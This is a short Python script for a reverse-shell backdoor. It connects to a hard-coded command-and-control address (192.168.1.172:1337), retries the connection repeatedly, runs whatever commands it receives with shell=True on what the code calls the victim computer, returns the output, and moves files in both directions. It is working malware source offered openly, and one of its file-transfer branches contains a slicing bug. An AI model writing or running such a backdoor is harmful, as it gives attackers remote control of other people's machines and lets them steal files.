import socket 
import time
import json
import subprocess
import os 

def send_command(action):
    jsondata=json.dumps(action)#convert a subset of Python objects into a json string
    so.send (jsondata.encode())#sending the encoded data via the socket

def receive_response():
    data = ""
    while True:
        try:  
            data = data + so.recv(1024).decode().rstrip() #socket receive 1024 bytes function and decoding 
            return json.loads(data)
        except ValueError:
            continue
def connection():
    while True:
        time.sleep(10)#wait for 10 seconds
        try:
            so.connect(("192.168.1.172",1337)) #trying to connect to the specified c2 server
            shell() #executing the commands function
            so.close() #closing the connection
            break
        except:
            connection() #if unsuccesfull retry

def upload(filename):
    f=open(filename, "rb")
    so.send(f.read())

def download_file(option):
    f=open(option, "wb") #write bytes option for opening the file 
    so.settimeout(1)
    chunk = so.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=so.recv(1024)
        except socket.timeout as e: #if we reach end of file 
            break
    so.settimeout(None)
    f.close()
        
def shell():
    while True:
        command = receive_response()
        if command == "quit":
            break
        elif command == "clear":
            pass
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command [:8]=="download":
            upload(command[9:])
        elif command [:6] == "upload":
            download_file(command[:7])
        
        else:
            #excute the command 
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE, stdin=subprocess.PIPE ) # running the command on the victim computer 
            result = execute.stdout.read() + execute.stderr.read() 
            result = result.decode()
            send_command(result)

so=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()


